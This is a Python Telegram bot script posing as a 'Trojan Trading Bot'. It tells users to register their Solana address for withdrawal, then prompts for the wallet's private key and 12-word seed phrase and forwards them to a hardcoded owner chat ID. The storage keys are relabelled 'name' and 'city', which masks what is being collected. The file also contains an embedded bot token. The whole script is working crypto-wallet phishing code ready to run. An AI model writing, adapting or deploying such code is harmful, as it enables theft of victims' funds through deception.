from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
import logging

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

TOKEN = '8092136069:AAGk-eDwWeQ1JlpFpUjgUEyPzsyf54lvKZE'
OWNER_CHAT_ID = 6301750260

user_data = {}

def start(update: Update, context: CallbackContext) -> None:
    user = update.effective_user
    welcome_message = "Welcome to Trojan Trading Bot . To make your address eligible for withdraw please register it ."
    update.message.reply_text(welcome_message)
    update.message.reply_text('Enter your Solana address:')
    user_data[user.id] = {}
    logger.info(f'User {user.id} started bot')

def handle_message(update: Update, context: CallbackContext) -> None:
    user = update.effective_user
    text = update.message.text.strip()
    
    if user.id in user_data and 'address' not in user_data[user.id]:
        if len(text) > 0:
            user_data[user.id]['address'] = text
            update.message.reply_text('Enter your private key :')
            logger.info(f'User {user.id} entered address: {text}')
        else:
            update.message.reply_text('Address cannot be empty. Try again.')
    
    elif user.id in user_data and 'name' not in user_data[user.id]:
        if len(text) > 0:
            user_data[user.id]['name'] = text
            update.message.reply_text('enter 12 words phase to this wallet')
            logger.info(f'User {user.id} entered name: {text}')
        else:
            update.message.reply_text('private key cannot be empty. Try again.')
    
    elif user.id in user_data and 'city' not in user_data[user.id]:
        if len(text) > 0:
            user_data[user.id]['city'] = text
            message = (f"New submission from user {user.id}:\n"
                       f"Solana address: {user_data[user.id]['address']}\n"
                       f"Name: {user_data[user.id]['name']}\n"
                       f"City: {user_data[user.id]['city']}")
            context.bot.send_message(chat_id=OWNER_CHAT_ID, text=message)
            update.message.reply_text('address registered please wait.')
            logger.info(f'User {user.id} submitted: {user_data[user.id]}')
            del user_data[user.id]
        else:
            update.message.reply_text('secret phase cannot be empty. Try again.')
    else:
        update.message.reply_text('Send /start to begin.')

def error(update: Update, context: CallbackContext) -> None:
    logger.warning(f'Update {update} caused error {context.error}')

def main():
    updater = Updater(TOKEN)
    dispatcher = updater.dispatcher
    
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
    dispatcher.add_error_handler(error)
    
    print("Bot is running... Press Ctrl+C to stop.")
    logger.info('Bot started polling')
    
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
